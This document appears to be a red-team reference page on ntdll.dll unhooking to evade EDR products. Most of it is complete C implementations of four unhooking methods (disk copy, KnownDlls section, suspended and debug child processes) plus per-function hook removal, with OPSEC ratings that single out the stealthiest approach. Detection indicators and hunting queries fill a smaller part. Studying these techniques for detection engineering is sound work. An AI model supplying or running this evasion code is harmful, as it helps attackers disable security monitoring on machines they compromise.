# Unhooking Variants - Educational Analysis

> **MITRE ATT&CK**: T1562.001 - Impair Defenses: Disable or Modify Tools
> **Purpose**: Understanding ntdll unhooking for detection engineering
> **Languages**: C
> **Detection Focus**: .text section integrity, KnownDlls access, child process patterns

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

EDR products hook ntdll.dll functions in user-mode processes to gain visibility into API calls.
These hooks are typically inline JMP instructions placed at the start of Nt* functions, redirecting
execution to EDR analysis code before allowing the original syscall to proceed. Unhooking techniques
restore the original ntdll bytes, removing EDR visibility and allowing direct syscall execution
without interception.

### Why This Matters for Red Team Leads
- ntdll hooks are the primary userland detection mechanism for most EDRs
- Understanding hook mechanics informs decisions about direct syscalls vs. unhooking
- Each unhooking variant has different OPSEC tradeoffs (file I/O, process creation, kernel objects)

### Detection Opportunity
Every unhooking approach requires obtaining a clean copy of ntdll and writing to the .text section.
Both steps are **detectable** through integrity monitoring, object access auditing, and memory
permission tracking.

## Technical Deep-Dive

### EDR Hook Anatomy

```
How EDR Hooks Work (ntdll.dll inline hooks):
─────────────────────────────────────────────

Original ntdll!NtCreateFile (unhooked):
  4C 8B D1          mov r10, rcx        ; Standard syscall stub
  B8 55 00 00 00    mov eax, 0x55       ; Syscall number
  0F 05             syscall             ; Transition to kernel
  C3                ret

Hooked ntdll!NtCreateFile (EDR installed):
  E9 XX XX XX XX    jmp edr_hook_addr   ; JMP to EDR analysis DLL
  B8 55 00 00 00    mov eax, 0x55       ; (partially overwritten)
  0F 05             syscall
  C3                ret

EDR Hook Flow:
  1. Process calls NtCreateFile
  2. JMP redirects to EDR analysis code (edr.dll)
  3. EDR logs parameters, checks policy, scans arguments
  4. If allowed: EDR jumps back to original code (after JMP)
  5. Syscall executes normally
  6. EDR may also hook the return path

Unhooking Goal:
  Restore the original bytes (4C 8B D1 B8 55...) so the JMP is removed
  and the function goes directly to the syscall without EDR interception.
```

### Why Four Different Approaches

```
Comparison: ntdll Restoration Methods
──────────────────────────────────────────────────────────────

Method 1: Disk Read
  Source: C:\Windows\System32\ntdll.dll file on disk
  Access: CreateFile → ReadFile → parse PE → extract .text
  OPSEC: File I/O is logged; EDR may monitor ntdll.dll reads
  Pros: Simple, reliable, works on all Windows versions
  Cons: File read telemetry, Sysmon Event ID 1/11 visibility

Method 2: KnownDlls Section
  Source: \KnownDlls\ntdll.dll section object (kernel cache)
  Access: NtOpenSection → NtMapViewOfSection → copy .text
  OPSEC: No file I/O; uses kernel section objects
  Pros: No disk access, fast, clean
  Cons: NtOpenSection on KnownDlls is monitorable

Method 3: Suspended Process
  Source: ntdll in a newly created suspended process (pre-hook)
  Access: CreateProcess(SUSPENDED) → ReadProcessMemory → copy .text
  OPSEC: Process creation is logged; suspended processes are suspicious
  Pros: Gets pre-hook ntdll before EDR applies hooks
  Cons: Child process creation telemetry, TerminateProcess afterward

Method 4: Debug Process
  Source: ntdll in a process spawned in DEBUG mode (pre-hook)
  Access: CreateProcess(DEBUG_PROCESS) → ReadProcessMemory → copy .text
  OPSEC: Debug events are logged; debugger attachment is visible
  Pros: Also gets pre-hook ntdll
  Cons: Similar to Method 3, plus debug-specific telemetry
```

### Method 1: Fresh Copy from Disk

```c
/*
 * Educational: Restoring ntdll.dll from the on-disk copy.
 *
 * This approach reads the original ntdll.dll from System32,
 * parses its PE headers to locate the .text section, and
 * copies the clean bytes over the hooked in-memory version.
 *
 * Steps:
 * 1. Open C:\Windows\System32\ntdll.dll (CreateFile)
 * 2. Read the file into a buffer (ReadFile)
 * 3. Parse PE headers to find .text section offset and size
 * 4. Get the in-memory ntdll base address (GetModuleHandle)
 * 5. Find the in-memory .text section address
 * 6. VirtualProtect the in-memory .text to PAGE_READWRITE
 * 7. memcpy the clean .text over the hooked .text
 * 8. VirtualProtect back to PAGE_EXECUTE_READ
 *
 * Detection:
 * - CreateFile/ReadFile on C:\Windows\System32\ntdll.dll
 *   Most processes never read ntdll from disk explicitly
 * - Sysmon Event ID 1 (process creation) + Event 11 (file access)
 * - VirtualProtect on ntdll .text section (PAGE_READWRITE)
 * - After unhooking: EDR hook functions are no longer called
 *   (sudden telemetry gap for the process)
 *
 * OPSEC Rating: LOW
 * File I/O to ntdll.dll is highly suspicious and widely monitored.
 */

#include <windows.h>
#include <stdio.h>

void unhook_ntdll_from_disk(void) {
    /*
     * Step 1: Read ntdll.dll from disk.
     *
     * Detection: File read on ntdll.dll. This is unusual for most
     * applications. EDR and Sysmon will log this file access.
     * Some EDRs specifically alert on reads of system DLLs.
     */
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open ntdll.dll: %lu\n", GetLastError());
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *fileBuffer = (BYTE *)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return;
    }

    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    /*
     * Step 2: Parse the disk copy's PE headers to find .text section.
     *
     * The .text section contains all the executable code, including
     * the Nt* syscall stubs that the EDR has hooked.
     */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(fileBuffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    /* Find .text section in the on-disk PE */
    DWORD textRVA = 0, textSize = 0, textRawOffset = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)section[i].Name, ".text") == 0) {
            textRVA = section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            textRawOffset = section[i].PointerToRawData;
            break;
        }
    }

    if (textRVA == 0) {
        printf("Failed to find .text section\n");
        free(fileBuffer);
        return;
    }

    /*
     * Step 3: Get the in-memory ntdll base and calculate .text address.
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE *inMemoryText = (BYTE *)hNtdll + textRVA;
    BYTE *cleanText = fileBuffer + textRawOffset;

    /*
     * Step 4: Make the in-memory .text section writable.
     *
     * Detection: VirtualProtect on ntdll.dll's .text section is
     * a VERY strong indicator. The .text section of system DLLs
     * should never need write permissions during normal operation.
     * This single API call is the most detectable step.
     */
    DWORD oldProtect;
    VirtualProtect(inMemoryText, textSize, PAGE_READWRITE, &oldProtect);

    /*
     * Step 5: Overwrite hooked .text with clean disk copy.
     * After this, all EDR hooks in ntdll are removed.
     */
    memcpy(inMemoryText, cleanText, textSize);

    /*
     * Step 6: Restore original protection.
     *
     * Detection: The permission change back to RX may also be logged,
     * but the damage (from EDR's perspective) is already done.
     */
    VirtualProtect(inMemoryText, textSize, oldProtect, &oldProtect);

    free(fileBuffer);
    printf("ntdll .text section restored from disk (%lu bytes)\n", textSize);
}
```

### Method 2: KnownDlls Section Mapping

```c
/*
 * Educational: Restoring ntdll via the KnownDlls section object.
 *
 * Windows caches frequently used DLLs as section objects under
 * \KnownDlls\ in the object manager namespace. These section
 * objects contain clean, unhooked copies of the DLLs because
 * they are created by the kernel during boot.
 *
 * Advantage: No file I/O required (no CreateFile/ReadFile).
 * The section object is already in memory.
 *
 * Steps:
 * 1. Open \KnownDlls\ntdll.dll section (NtOpenSection)
 * 2. Map the section into the process (NtMapViewOfSection)
 * 3. Parse the mapped PE to find .text section
 * 4. Copy clean .text over hooked .text (same as Method 1)
 * 5. Unmap the clean copy
 *
 * Detection:
 * - NtOpenSection on \KnownDlls\ntdll.dll is unusual
 * - Most processes never access KnownDlls section objects directly
 * - Object access auditing (if enabled) will log the handle open
 * - VirtualProtect on ntdll .text section (same as all methods)
 *
 * OPSEC Rating: MEDIUM-HIGH
 * Avoids file I/O but NtOpenSection on KnownDlls is itself detectable.
 * Best among the four methods from an OPSEC perspective.
 */

/* Ntdll function typedefs (not in standard headers) */
typedef struct _UNICODE_STRING_NT {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_NT;

typedef struct _OBJECT_ATTRIBUTES_NT {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING_NT *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES_NT;

#define OBJ_CASE_INSENSITIVE 0x00000040

typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES_NT *ObjectAttributes
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

void unhook_ntdll_from_knowndlls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    /*
     * Resolve NtOpenSection, NtMapViewOfSection, NtUnmapViewOfSection.
     *
     * Note: If ntdll is already hooked, these resolved functions may
     * themselves be hooked. However, NtOpenSection and NtMapViewOfSection
     * are rarely hooked by EDRs (they focus on Nt*File, Nt*Process, etc.).
     *
     * Detection: GetProcAddress for NtOpenSection + NtMapViewOfSection
     * followed by KnownDlls access is a strong behavioral indicator.
     */
    pNtOpenSection _NtOpenSection =
        (pNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    pNtMapViewOfSection _NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection _NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    if (!_NtOpenSection || !_NtMapViewOfSection || !_NtUnmapViewOfSection) {
        printf("Failed to resolve Nt section APIs\n");
        return;
    }

    /*
     * Open the KnownDlls section for ntdll.dll.
     *
     * Detection: NtOpenSection on \KnownDlls\ntdll.dll
     * This is the key indicator for this method. Normal processes
     * never open KnownDlls sections directly - the loader does it
     * internally during process initialization.
     */
    HANDLE hSection = NULL;
    UNICODE_STRING_NT sectionName;
    WCHAR nameBuffer[] = L"\\KnownDlls\\ntdll.dll";
    sectionName.Buffer = nameBuffer;
    sectionName.Length = (USHORT)(wcslen(nameBuffer) * sizeof(WCHAR));
    sectionName.MaximumLength = sectionName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES_NT objAttr;
    memset(&objAttr, 0, sizeof(objAttr));
    objAttr.Length = sizeof(objAttr);
    objAttr.ObjectName = &sectionName;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;

    NTSTATUS status = _NtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("NtOpenSection failed: 0x%08X\n", (unsigned int)status);
        return;
    }

    /*
     * Map the clean ntdll section into our process.
     * This gives us a read-only view of the unhooked ntdll.
     */
    PVOID cleanNtdll = NULL;
    SIZE_T viewSize = 0;
    status = _NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &cleanNtdll,
        0, 0, NULL,
        &viewSize,
        1, /* ViewShare */
        0,
        PAGE_READONLY
    );

    if (status != 0 || !cleanNtdll) {
        printf("NtMapViewOfSection failed: 0x%08X\n", (unsigned int)status);
        CloseHandle(hSection);
        return;
    }

    /*
     * Parse the clean copy's PE headers and find .text section.
     * Then overwrite the hooked .text with the clean version.
     * (Same .text extraction and overwrite logic as Method 1)
     */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)section[i].Name, ".text") == 0) {
            BYTE *hookedText = (BYTE *)ntdll + section[i].VirtualAddress;
            BYTE *cleanText = (BYTE *)cleanNtdll + section[i].VirtualAddress;
            DWORD textSize = section[i].Misc.VirtualSize;

            /* Make hooked .text writable, overwrite, restore protection */
            DWORD oldProtect;
            VirtualProtect(hookedText, textSize, PAGE_READWRITE, &oldProtect);
            memcpy(hookedText, cleanText, textSize);
            VirtualProtect(hookedText, textSize, oldProtect, &oldProtect);

            printf("ntdll .text restored from KnownDlls (%lu bytes)\n", textSize);
            break;
        }
    }

    /* Cleanup: unmap the clean copy and close the section handle */
    _NtUnmapViewOfSection(GetCurrentProcess(), cleanNtdll);
    CloseHandle(hSection);
}
```

### Method 3: Suspended Process Copy

```c
/*
 * Educational: Restoring ntdll from a suspended child process.
 *
 * When a process is created in SUSPENDED state, the Windows loader
 * maps ntdll.dll but EDR hooks have NOT yet been applied (hooks are
 * typically applied during DLL load notifications or APC injection
 * during process initialization).
 *
 * Steps:
 * 1. CreateProcess with CREATE_SUSPENDED flag
 * 2. Read the child's ntdll .text section (ReadProcessMemory)
 * 3. Copy the clean bytes into our own ntdll .text section
 * 4. TerminateProcess the suspended child
 *
 * Detection:
 * - Process creation with CREATE_SUSPENDED flag
 * - ReadProcessMemory from parent to child's ntdll address range
 * - Immediate TerminateProcess after ReadProcessMemory (short-lived child)
 * - Sysmon Event 1 (process creation) + Event 5 (process termination)
 *   with very short process lifetime = suspicious pattern
 * - VirtualProtect on ntdll .text in the parent process
 *
 * OPSEC Rating: LOW
 * Child process creation is highly visible. Short-lived suspended
 * processes are a well-known indicator of unhooking or process hollowing.
 */
void unhook_ntdll_from_suspended_process(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    /*
     * Step 1: Create a suspended process.
     * svchost.exe is often used as a target because it is a common
     * system process, but ANY executable will work since we only
     * need its ntdll mapping.
     *
     * Detection: CREATE_SUSPENDED process creation. EDRs specifically
     * watch for this flag because it is used in process injection,
     * process hollowing, and unhooking techniques.
     */
    BOOL created = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,   /* ← Key flag: process does not run */
        NULL, NULL, &si, &pi
    );

    if (!created) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    /*
     * Step 2: Find ntdll in the child process.
     * ntdll is always mapped at the same address in all processes
     * on the same boot session (ASLR is per-boot, not per-process
     * for system DLLs). So we can use our own ntdll base address.
     *
     * Detection: ReadProcessMemory targeting ntdll address range.
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)section[i].Name, ".text") == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            BYTE *localText = (BYTE *)hNtdll + section[i].VirtualAddress;

            /* Allocate buffer for clean .text from child */
            BYTE *cleanText = (BYTE *)malloc(textSize);
            if (!cleanText) break;

            /*
             * Read the child's clean (unhooked) ntdll .text section.
             * Because the process is suspended, EDR hooks are not yet applied.
             *
             * Detection: ReadProcessMemory call targeting DLL .text section
             * addresses. This is unusual - legitimate software rarely reads
             * another process's DLL code sections.
             */
            SIZE_T bytesRead;
            ReadProcessMemory(
                pi.hProcess,
                localText,  /* Same address in child (ASLR symmetry) */
                cleanText,
                textSize,
                &bytesRead
            );

            /* Overwrite our hooked .text with the clean copy */
            DWORD oldProtect;
            VirtualProtect(localText, textSize, PAGE_READWRITE, &oldProtect);
            memcpy(localText, cleanText, textSize);
            VirtualProtect(localText, textSize, oldProtect, &oldProtect);

            free(cleanText);
            printf("ntdll .text restored from suspended process (%lu bytes)\n", textSize);
            break;
        }
    }

    /*
     * Step 3: Terminate the suspended child process.
     *
     * Detection: Process creation → ReadProcessMemory → TerminateProcess
     * within milliseconds is a strong behavioral indicator.
     * The child process had an extremely short lifetime and never
     * actually executed any code.
     */
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

### Method 4: Debug Process Copy

```c
/*
 * Educational: Restoring ntdll from a child process in DEBUG mode.
 *
 * Similar to the suspended process method, but uses DEBUG_PROCESS
 * instead of CREATE_SUSPENDED. When a process is created with
 * DEBUG_PROCESS, the parent receives debug events and the child
 * is effectively suspended at startup.
 *
 * The advantage: some EDRs specifically watch for CREATE_SUSPENDED
 * but may be less attentive to DEBUG_PROCESS usage.
 *
 * Steps:
 * 1. CreateProcess with DEBUG_PROCESS flag
 * 2. Wait for initial debug event (process creation notification)
 * 3. ReadProcessMemory to copy child's ntdll .text section
 * 4. TerminateProcess the debug child
 *
 * Detection:
 * - Process creation with DEBUG_PROCESS flag
 * - Debug events (OutputDebugString monitoring in ETW)
 * - ReadProcessMemory targeting ntdll .text section
 * - Immediate TerminateProcess after read (same short-lived pattern)
 * - NtRemoveProcessDebug or DebugActiveProcessStop calls
 *
 * OPSEC Rating: LOW
 * Debug process creation is even more unusual than suspended creation
 * for non-debugger processes. The debug flag itself is a strong indicator.
 */
void unhook_ntdll_from_debug_process(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    /*
     * Create a process in DEBUG mode.
     *
     * Detection: DEBUG_PROCESS flag used by a non-debugger process.
     * Very few legitimate applications use DEBUG_PROCESS. If the
     * parent is not a known debugger (Visual Studio, WinDbg, etc.),
     * this is highly suspicious.
     */
    BOOL created = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        DEBUG_PROCESS,  /* ← Debug mode: parent receives debug events */
        NULL, NULL, &si, &pi
    );

    if (!created) {
        printf("CreateProcess (DEBUG) failed: %lu\n", GetLastError());
        return;
    }

    /*
     * Wait for the initial CREATE_PROCESS_DEBUG_EVENT.
     * At this point the child exists but has not fully initialized,
     * so EDR hooks are not yet applied to its ntdll.
     *
     * Detection: WaitForDebugEvent calls from non-debugger process.
     */
    DEBUG_EVENT debugEvent;
    WaitForDebugEvent(&debugEvent, INFINITE);

    /* Read clean ntdll .text from the debug child */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)section[i].Name, ".text") == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            BYTE *localText = (BYTE *)hNtdll + section[i].VirtualAddress;
            BYTE *cleanText = (BYTE *)malloc(textSize);
            if (!cleanText) break;

            SIZE_T bytesRead;
            ReadProcessMemory(pi.hProcess, localText, cleanText, textSize, &bytesRead);

            DWORD oldProtect;
            VirtualProtect(localText, textSize, PAGE_READWRITE, &oldProtect);
            memcpy(localText, cleanText, textSize);
            VirtualProtect(localText, textSize, oldProtect, &oldProtect);

            free(cleanText);
            printf("ntdll .text restored from debug process (%lu bytes)\n", textSize);
            break;
        }
    }

    /*
     * Cleanup: terminate the debug child and detach.
     *
     * Detection: Short process lifetime + debug flags + ReadProcessMemory
     * targeting DLL .text sections = HIGH confidence unhooking indicator.
     */
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

### Partial vs. Full Unhooking

```c
/*
 * Educational: Targeted (per-function) unhooking vs. full .text restoration.
 *
 * Full Unhooking:
 * - Replaces the entire .text section (~hundreds of KB)
 * - Removes ALL hooks in ntdll at once
 * - Simpler to implement but NOISIER
 * - The VirtualProtect call covers a large memory region
 * - Easier to detect: large-scale .text section write
 *
 * Per-Function Unhooking:
 * - Restores only specific functions (e.g., NtCreateFile, NtAllocateVirtualMemory)
 * - Only 5-6 bytes per function (the overwritten syscall stub)
 * - Much smaller memory write footprint
 * - Harder to detect but requires knowing which functions to restore
 *
 * Per-function approach: read the original syscall stub bytes from
 * the clean source and write just those bytes back.
 *
 * Syscall stub structure (x64, 12 bytes):
 *   4C 8B D1          mov r10, rcx        (3 bytes)
 *   B8 XX 00 00 00    mov eax, SSN        (5 bytes) ← Syscall number
 *   0F 05             syscall             (2 bytes)
 *   C3                ret                 (1 byte)
 *   CC                int3 (padding)      (1 byte)
 *
 * The EDR hook overwrites the first 5+ bytes (E9 XX XX XX XX = JMP).
 * Restoring just those bytes removes the hook for that function.
 *
 * Detection:
 * - VirtualProtect on very small ntdll regions (5-12 bytes)
 * - Write operations targeting known Nt* function entry points
 * - Intermittent: function A is hooked, function B is not (inconsistency)
 */

void per_function_unhook_example(const char *functionName, BYTE *cleanStub, DWORD stubSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);

    if (!pFunc) {
        printf("Function %s not found\n", functionName);
        return;
    }

    /*
     * Check if the function is hooked by examining first byte.
     *
     * Hooked:   0xE9 (JMP rel32) or 0xFF (JMP/CALL indirect)
     * Unhooked: 0x4C (mov r10, rcx - start of syscall stub)
     */
    BYTE firstByte = *(BYTE *)pFunc;
    if (firstByte == 0x4C) {
        printf("%s appears unhooked (starts with 0x4C)\n", functionName);
        return;
    }

    printf("%s appears HOOKED (first byte: 0x%02X)\n", functionName, firstByte);

    /*
     * Restore just the syscall stub bytes (5-12 bytes).
     *
     * Detection: VirtualProtect on a tiny region within ntdll .text
     * is suspicious. The small size (vs. full .text) is actually
     * detectable by checking the dwSize parameter of VirtualProtect.
     *
     * OPSEC: Changing just 5 bytes is less noisy than full .text
     * replacement, but targeted monitoring can still detect it.
     */
    DWORD oldProtect;
    VirtualProtect((LPVOID)pFunc, stubSize, PAGE_READWRITE, &oldProtect);
    memcpy((LPVOID)pFunc, cleanStub, stubSize);
    VirtualProtect((LPVOID)pFunc, stubSize, oldProtect, &oldProtect);

    printf("%s restored (%lu bytes)\n", functionName, stubSize);
}
```

### OPSEC Comparison

```
┌─────────────────────────────┬─────────┬────────────────┬──────────────────┐
│ Method                      │ OPSEC   │ Disk I/O       │ Process Creation │
├─────────────────────────────┼─────────┼────────────────┼──────────────────┤
│ 1. Fresh copy from disk     │ Low     │ Yes (ntdll.dll)│ No               │
│ 2. KnownDlls section        │ Med-High│ No             │ No               │
│ 3. Suspended process copy   │ Low     │ No             │ Yes (SUSPENDED)  │
│ 4. Debug process copy       │ Low     │ No             │ Yes (DEBUG)      │
│ Per-function (any source)   │ Higher* │ Depends        │ Depends          │
└─────────────────────────────┴─────────┴────────────────┴──────────────────┘

* Per-function unhooking has better OPSEC than full .text replacement
  regardless of the source method, because the memory write footprint
  is much smaller (5-12 bytes vs. hundreds of KB).

Key Takeaway:
- KnownDlls (Method 2) is the cleanest: no file I/O, no child process
- Per-function unhooking (from any source) is stealthier than full .text
- All methods require VirtualProtect on ntdll .text, which is the
  strongest single detection anchor
```

## Detection Indicators

### Primary Indicators

1. **VirtualProtect on ntdll .text section**: Any VirtualProtect call that changes
   permissions on ntdll.dll's .text section to include WRITE is the strongest single
   indicator. This should never happen in normal operation.

2. **.text section integrity**: Periodically compare ntdll .text in-memory against the
   on-disk or KnownDlls version. Any differences (after accounting for EDR hooks
   themselves) indicate tampering.

3. **Hook absence**: If EDR hooks were present and suddenly disappear from ntdll
   functions, unhooking has occurred. Monitor hook integrity from the EDR driver.

### Per-Method Detection

| Method | Key Telemetry | Event Source |
|--------|--------------|--------------|
| Disk read | CreateFile on ntdll.dll | Sysmon Event 11, ETW |
| KnownDlls | NtOpenSection on \KnownDlls\ | Object access auditing |
| Suspended process | CREATE_SUSPENDED + ReadProcessMemory | Sysmon Event 1, 10 |
| Debug process | DEBUG_PROCESS + WaitForDebugEvent | Sysmon Event 1, ETW |
| All methods | VirtualProtect(ntdll .text, RW) | ETW, EDR kernel callbacks |

### Hunting Queries

```
# Detect ntdll.dll file reads (Method 1)
event.action == "file_read" AND file.path == "C:\Windows\System32\ntdll.dll"
  AND process.name NOT IN ("MsMpEng.exe", "csrss.exe", "smss.exe")

# Detect KnownDlls section access (Method 2)
event.action == "object_access" AND object.name CONTAINS "KnownDlls"
  AND process.name NOT IN ("smss.exe", "csrss.exe")

# Detect short-lived suspended/debug child processes (Methods 3, 4)
process.creation_flags IN ("CREATE_SUSPENDED", "DEBUG_PROCESS")
  AND process.lifetime < 5s
  AND parent.process.name NOT IN ("devenv.exe", "windbg.exe")

# Detect VirtualProtect on ntdll .text (All methods)
api.name == "VirtualProtect"
  AND memory.region OVERLAPS ntdll.text_section
  AND memory.new_protection CONTAINS "WRITE"
```

## Cross-References

- [ETW Patching](etw-patching.md) - ETW can also be patched via similar .text overwrite
- [AMSI Patching](amsi-patching.md) - AMSI patching uses the same VirtualProtect technique
- [PE Loader](pe-loader.md) - PE section parsing used to locate .text
- [Callback Injection](callback-injection.md) - unhooking enables clean callback execution
- [Stack Spoofing](stack-spoofing.md) - combined with unhooking for full evasion
- [Direct Syscalls](../syscalls-and-evasion/direct-syscalls.md) - alternative to unhooking
- [AV/EDR Evasion Theory](../../06-defense-evasion/av-edr-evasion.md)

## References

- MITRE ATT&CK T1562.001
- ired.team: Full DLL Unhooking with C++
- MDSec: Bypassing EDR Hooks via KnownDlls
- Sektor7: Malware Development - Intermediate (unhooking module)
- Elastic Security: Detecting ntdll Unhooking Techniques
- RefleXXion: KnownDlls-based ntdll unhooking implementation
